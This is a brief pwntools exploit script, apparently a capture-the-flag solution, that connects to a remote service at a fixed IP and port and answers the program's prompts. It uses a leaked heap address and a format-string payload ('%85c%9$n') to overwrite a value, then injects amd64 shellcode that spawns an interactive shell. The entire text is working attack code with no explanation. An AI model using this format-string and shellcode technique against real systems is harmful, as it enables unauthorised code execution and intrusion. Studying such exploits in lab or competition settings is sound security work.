from pwn import *
context.log_level = "debug"
# p = process("./string")
p = remote("111.198.29.45" , 30879)

p.recvuntil("secret[0] is ")
heap_addr = int(p.recvuntil("\n" , drop = True) , 16)
p.sendlineafter("name be:" , "fantasy")
# reverse to get true road
p.sendlineafter("?:\n" , "east")
p.sendlineafter("(0)?:" , "1")
p.sendlineafter("address'\n" , "1")
# string format for modify the target value 
payload = "%85c%9$n" + p64(heap_addr)
p.sendlineafter("you wish is:\n" , payload)
# shellcode for getshell
context.arch = "amd64"
shellcode = asm(shellcraft.amd64.linux.sh())
p.sendafter("USE YOU SPELL" , shellcode)

p.interactive()